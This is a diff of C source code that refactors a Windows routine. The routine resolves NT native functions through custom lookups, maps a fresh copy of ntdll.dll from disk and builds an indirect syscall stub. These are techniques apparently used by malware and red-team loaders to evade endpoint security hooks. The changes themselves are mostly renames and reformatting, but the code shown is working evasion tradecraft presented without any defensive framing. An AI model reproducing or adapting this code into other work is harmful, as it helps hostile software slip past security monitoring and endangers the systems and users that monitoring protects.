@@ -9,10 +9,10 @@ STRINGW(ntdll_path, "\\SystemRoot\\System32\\ntdll.dll");
 
 STRINGA(ntcreatefile, "NtCreateFile");
 STRINGA(ntcreatesection, "NtCreateSection");
-STRINGA(ntmapview, "NtMapViewOfSection");
+STRINGA(ntmapviewofsection, "NtMapViewOfSection");
 STRINGA(ntclose, "NtClose");
-STRINGA(ntallocvm, "NtAllocateVirtualMemory");
-STRINGA(ntprotectvm, "NtProtectVirtualMemory");
+STRINGA(ntallocatevirtualmemory, "NtAllocateVirtualMemory");
+STRINGA(ntprotectvirtualmemory, "NtProtectVirtualMemory");
 
 /* ================= Types ================= */
 typedef enum _SECTION_INHERIT {
@@ -46,7 +46,16 @@ typedef struct _NTDLL_DISK_CTX {
 static NTDLL_DISK_CTX MapNtdllFromDisk(void) {
     NTDLL_DISK_CTX ctx = {0};
 
+    NTSTATUS (NTAPI *NtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
+    NTSTATUS (NTAPI *NtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
+    NTSTATUS (NTAPI *NtMapViewOfSection)(HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
+    NTSTATUS (NTAPI *NtClose)(HANDLE);
+
     HMODULE ntdll = myGetModuleHandleA(ntdll_dll);
+    NtCreateFile = (void *)myGetProcAddress(ntdll, ntcreatefile);
+    NtCreateSection = (void *)myGetProcAddress(ntdll, ntcreatesection);
+    NtMapViewOfSection = (void *)myGetProcAddress(ntdll, ntmapviewofsection);
+    NtClose = (void *)myGetProcAddress(ntdll, ntclose);
 
     UNICODE_STRING us;
     InitUnicodeString(&us, ntdll_path);
@@ -56,58 +65,27 @@ static NTDLL_DISK_CTX MapNtdllFromDisk(void) {
 
     HANDLE hFile;
     IO_STATUS_BLOCK iosb;
-
-    NTSTATUS (NTAPI *NtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
-        PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG) =
-        (void *)myGetProcAddress(ntdll, ntcreatefile);
-
-    NtCreateFile(&hFile, FILE_GENERIC_READ, &oa, &iosb, NULL,
-                 FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ,
-                 FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);
+    NtCreateFile(&hFile, FILE_GENERIC_READ, &oa, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);
 
     HANDLE hSection;
-    NTSTATUS (NTAPI *NtCreateSection)(PHANDLE, ACCESS_MASK,
-        POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE) =
-        (void *)myGetProcAddress(ntdll, ntcreatesection);
-
-    NtCreateSection(&hSection, SECTION_MAP_READ, NULL, NULL,
-                    PAGE_READONLY, SEC_IMAGE, hFile);
+    NtCreateSection(&hSection, SECTION_MAP_READ, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
 
     PVOID base = NULL;
     SIZE_T size = 0;
-
-    NTSTATUS (NTAPI *NtMapViewOfSection)(HANDLE, HANDLE, PVOID *,
-        ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG) =
-        (void *)myGetProcAddress(ntdll, ntmapview);
-
-    NtMapViewOfSection(hSection, (HANDLE)-1, &base, 0, 0,
-                       NULL, &size, ViewShare, 0, PAGE_READONLY);
-
-    NTSTATUS (NTAPI *NtClose)(HANDLE) =
-        (void *)myGetProcAddress(ntdll, ntclose);
+    NtMapViewOfSection(hSection, (HANDLE)-1, &base, 0, 0, NULL, &size, ViewShare, 0, PAGE_READONLY);
 
     NtClose(hSection);
     NtClose(hFile);
 
     IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
-    IMAGE_NT_HEADERS *nt =
-        (IMAGE_NT_HEADERS *)((BYTE *)base + dos->e_lfanew);
+    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)base + dos->e_lfanew);
 
     SIZE_T min_size = nt->OptionalHeader.SizeOfHeaders;
-
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
-        IMAGE_SECTION_HEADER *sect =
-            (IMAGE_SECTION_HEADER *)((BYTE *)nt +
-             sizeof(IMAGE_NT_HEADERS) +
-             i * sizeof(IMAGE_SECTION_HEADER));
-
-        if ((sect->Characteristics & IMAGE_SCN_CNT_CODE) ||
-            sect->VirtualAddress <=
-            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress) {
-
+        IMAGE_SECTION_HEADER *sect = (IMAGE_SECTION_HEADER *)((BYTE *)nt + sizeof(IMAGE_NT_HEADERS) + i * sizeof(IMAGE_SECTION_HEADER));
+        if (sect->Characteristics & IMAGE_SCN_CNT_CODE || sect->VirtualAddress <= nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress) {
             SIZE_T end = sect->VirtualAddress + sect->Misc.VirtualSize;
-            if (end > min_size)
-                min_size = end;
+            if (end > min_size) min_size = end;
         }
     }
 
@@ -177,12 +155,12 @@ static void *BuildIndirectSyscallStub(DWORD ssn, void *syscall_addr) {
     NTSTATUS (NTAPI *NtAllocateVirtualMemory)(HANDLE, PVOID *,
         ULONG_PTR, PSIZE_T, ULONG, ULONG) =
         (void *)myGetProcAddress(
-            myGetModuleHandleA(ntdll_dll), ntallocvm);
+            myGetModuleHandleA(ntdll_dll), ntallocatevirtualmemory);
 
     NTSTATUS (NTAPI *NtProtectVirtualMemory)(HANDLE, PVOID *,
         PSIZE_T, ULONG, PULONG) =
         (void *)myGetProcAddress(
-            myGetModuleHandleA(ntdll_dll), ntprotectvm);
+            myGetModuleHandleA(ntdll_dll), ntprotectvirtualmemory);
 
     PVOID base = NULL;
     SIZE_T size = 22;
